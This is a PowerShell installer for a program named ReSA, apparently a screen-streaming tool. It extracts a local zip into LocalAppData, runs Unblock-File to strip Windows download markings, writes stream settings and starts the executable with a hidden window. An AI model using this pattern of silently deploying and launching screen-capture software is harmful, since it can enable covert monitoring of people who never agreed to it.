# Install ReSA from a local ReSA.zip (skip download)
# Usage: put ReSA.zip in Downloads folder, then run this script
param(
    [string]$SourceZip = ""
)

$ErrorActionPreference = "Continue"
$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"

if (-not $SourceZip) {
    $candidates = @(
        (Join-Path $env:USERPROFILE "Downloads\ReSA.zip"),
        (Join-Path $env:TEMP "ReSA-download.zip"),
        (Join-Path $PSScriptRoot "ReSA.zip")
    )
    foreach ($c in $candidates) {
        if ((Test-Path -LiteralPath $c) -and ((Get-Item -LiteralPath $c).Length -gt 1048576)) {
            $SourceZip = $c
            break
        }
    }
}

if (-not $SourceZip -or -not (Test-Path -LiteralPath $SourceZip)) {
    Write-Host "ReSA.zip not found. Download first:" -ForegroundColor Red
    Write-Host "  https://olxp.cc/download/ReSA.zip"
    Write-Host "Save to Downloads\ReSA.zip then run this script again."
    Read-Host "Press Enter"
    exit 1
}

$size = (Get-Item -LiteralPath $SourceZip).Length
Write-Host ("Found: " + $SourceZip + " (" + $size + " bytes)")

$stage = Join-Path $env:TEMP ("ReSA-stage-" + [Guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Force -Path $stage | Out-Null
try {
    $tar = Join-Path $env:SystemRoot "System32\tar.exe"
    if (Test-Path -LiteralPath $tar) {
        & $tar -xf $SourceZip -C $stage
        if ($LASTEXITCODE -ne 0) {
            throw ("tar extract failed: " + $LASTEXITCODE)
        }
    } else {
        Expand-Archive -LiteralPath $SourceZip -DestinationPath $stage -Force
    }

    $root = $stage
    if (-not (Test-Path -LiteralPath (Join-Path $stage "ReSA.exe"))) {
        $nested = Join-Path $stage "ReSA"
        if (Test-Path -LiteralPath (Join-Path $nested "ReSA.exe")) {
            $root = $nested
        }
    }
    if (-not (Test-Path -LiteralPath (Join-Path $root "ReSA.exe"))) {
        throw "ReSA.exe missing in zip"
    }

    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    & robocopy.exe $root $Dir /E /R:2 /W:1 /NFL /NDL /NJH /NJS /nc /ns /np | Out-Null
    if ($LASTEXITCODE -ge 8) {
        throw ("robocopy failed: " + $LASTEXITCODE)
    }
    Get-ChildItem -LiteralPath $Dir -Directory -Filter "_MEI*" -ErrorAction SilentlyContinue |
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Get-ChildItem -LiteralPath $Dir -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object { Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue }
} catch {
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Press Enter"
    exit 1
} finally {
    Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Write-Host "ReSA.exe missing after extract." -ForegroundColor Red
    Read-Host "Press Enter"
    exit 1
}

$settingsPath = Join-Path $Dir "settings.json"
if (-not (Test-Path -LiteralPath $settingsPath)) {
    $json = @'
{
  "streamWidth": 1100,
  "fps": 10,
  "quality": 60
}
'@.Trim()
    [IO.File]::WriteAllText($settingsPath, $json, (New-Object System.Text.UTF8Encoding $false))
}

Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
Write-Host "ReSA installed and started." -ForegroundColor Green
Start-Sleep -Seconds 2
